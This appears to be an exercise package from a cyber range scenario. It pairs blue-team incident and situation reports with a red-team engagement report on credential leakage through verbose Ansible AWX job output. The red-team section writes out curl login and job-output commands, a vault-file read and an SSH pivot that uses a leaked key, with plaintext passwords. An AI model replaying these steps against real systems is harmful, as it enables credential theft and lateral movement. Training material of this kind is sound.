# Incident Notification Report (INREP)
**Classification:** RESTRICTED — Internal Use Only
**Report ID:** INREP-IT02-M05
**Incident:** GRIDFALL-RNG-IT02-M05

---

## 1. Current Situation
The Ansible AWX job runner portal (`203.x.x.x:8080`) stores historical job output with verbose logging enabled. Job `JOB-20241115-018 (deploy-dev-infra)` contains two critical credential leaks in its logged output: the Ansible vault password (`Ansibl3Vault@PUL!GridFall2024`) echoed from `/etc/ansible/.vault_pass`, and the SSH private key for `devops@dev-jump.prabalurja.in (11.x.x.x)`. An adversary authenticated as `devops-admin` accessed this job output and has established an SSH session to the DEV zone jump host. **RNG-IT-02 has been fully compromised — pivot to RNG-DEV-01 is in progress.**

**Threat Level:** `CRITICAL`

## 2. IOCs
| Type | Value |
|---|---|
| Attacker IP | `203.0.2.X` |
| Account Used | `devops-admin` |
| Exposed Vault Pass | `Ansibl3Vault@PUL!GridFall2024` |
| Exposed SSH Key | `devops@dev-jump.prabalurja.in` Ed25519 key |
| Pivot Achieved | SSH session to `11.x.x.x` — RNG-DEV-01 |

## 3. Vulnerability
- Ansible verbose job output (`-vvv`) logs vault password file contents to stdout, retained permanently in AWX job history.
- No `no_log: true` directive on tasks handling private key provisioning.
- AWX job history accessible to all authenticated accounts regardless of team ownership.

## 4. Prevention
- `no_log: true` on all tasks using vault passwords or writing key material.
- AWX job output access controls — restrict to job owner + admin only.
- Vault password must never pass through stdout — use Vault Agent or environment injection.
- SSH key provisioning must use Ansible vault lookup with `no_log: true` and never write raw key to stdout.

## POC
> **[Attach: AWX job output screenshot showing vault password and SSH key in plain text]**
> **[Attach: SSH auth log on dev-jump.prabalurja.in confirming unauthorised login]**

**Prepared By:** Blue Team — [Team Name] | **Reference:** GRIDFALL-RNG-IT02-M05

---

# Situation Report (SITREP)
**Report ID:** SITREP-IT02-M05 | **Incident:** GRIDFALL-RNG-IT02-M05

## 1. Incident Overview
- Ansible AWX portal (`203.x.x.x:8080`) — verbose job output for `deploy-dev-infra` exposes vault password and SSH private key.
- Adversary (`devops-admin`) accessed job history — extracted both secrets.
- SSH session established to `devops@dev-jump.prabalurja.in (11.x.x.x)`.
- **RNG-IT-02 credential chain fully exploited. Pivot to RNG-DEV-01 complete.**

**Severity:** `CRITICAL` | **Impact:** `SEVERE` — Full IT-OPS zone compromised, DEV zone entry achieved.

## 2. Full RNG-IT-02 Attack Chain (Summary)
```
[RNG-IT-01 M5 Redis] → M1 LDAP (anon bind → userPassword-plain)
  → M2 Gitea (git history → Vault AppRole creds)
  → M3 Vault (dev mode → journal root token → secret/pul/ad)
  → M4 Prometheus (unauthenticated /metrics → URL-encoded credentials)
  → M5 AWX (verbose job output → vault pass + SSH key)
  → PIVOT: RNG-DEV-01 (11.x.x.x/24) via SSH to dev-jump.prabalurja.in
```

## 3. Response Actions
**Containment:** SSH key revoked on jump host; `devops-admin` account locked; AWX access restricted; attacker IP blocked at perimeter.
**Eradication:** All job outputs audited and purged of credential material; verbose logging disabled at AWX; `no_log: true` added to all secret-handling tasks; vault password rotated; new SSH key pair generated.
**Recovery:** DEV zone access reviewed — new keys provisioned; RNG-DEV-01 team notified of potential compromise.
**Lessons Learned:** Verbose Ansible logging in CI/CD platforms is a pervasive credential leak vector in infrastructure automation. Job output access must be treated as sensitive data — not general read-accessible to all portal users.

## 4. TTPs
- **T1552.001** — Credentials in Files: Vault password and SSH key in AWX job output.
- **T1552.004** — Private Keys: SSH Ed25519 private key in plaintext job log.
- **T1021.004** — Remote Services: SSH — pivot to jump host using extracted key.

## 5. Communication
- **SOC Lead:** Full RNG-IT-02 chain compromised — 5 machines, 5 vulnerabilities, DEV zone breach.
- **DEV Zone Team (RNG-DEV-01):** URGENT — unauthorised SSH access to jump host; assume DEV zone integrity compromised.
- **CERT-In:** Notification required — CII-adjacent CI/CD credential chain fully exploited.

## POC
> **[Attach: AWX job output — vault password line highlighted]**
> **[Attach: AWX job output — SSH key block highlighted]**
> **[Attach: SSH auth.log — unauthorised login to dev-jump]**

**Prepared By:** Blue Team — [Team Name] | **Reference:** GRIDFALL-RNG-IT02-M05

---

# Red Team Engagement Report
**Report ID:** RED-REPORT-IT02-M05 | **Machine:** M5 — itops-ansible

| Field | Detail |
|---|---|
| Target | PUL Ansible AWX Portal `203.x.x.x:8080` |
| Attack Class | Credential Exposure in CI/CD Job Output |
| Outcome | **SUCCESSFUL** — Vault pass + SSH key extracted; RNG-DEV-01 pivot achieved |
| Pivot From | M4 Prometheus `/metrics` — `devops-admin:DevOps@PUL!24` |

## Commands Executed
```bash
# Login + access job output
curl -c /tmp/awx.jar -X POST http://203.x.x.x:8080/login \
  -d "username=devops-admin&password=DevOps%40PUL%2124"
curl -b /tmp/awx.jar http://203.x.x.x:8080/jobs/JOB-20241115-018
# → Extract vault password and SSH key from output

# OR: Use file browser
curl -b /tmp/awx.jar "http://203.x.x.x:8080/files?path=/group_vars/all/vault.yml"

# Pivot
chmod 600 /tmp/dev_jump_key
ssh -i /tmp/dev_jump_key -o StrictHostKeyChecking=no devops@11.x.x.x
```

## Pivot Artifact
| Artifact | Value |
|---|---|
| Ansible Vault Pass | `Ansibl3Vault@PUL!GridFall2024` |
| Jump Host | `dev-jump.prabalurja.in` / `11.x.x.x` |
| SSH User | `devops` |
| Next Zone | RNG-DEV-01 (`11.x.x.x/24`) |

**Report Prepared By:** [Red Team Operator] | **Classification:** RESTRICTED — WHITE TEAM ONLY
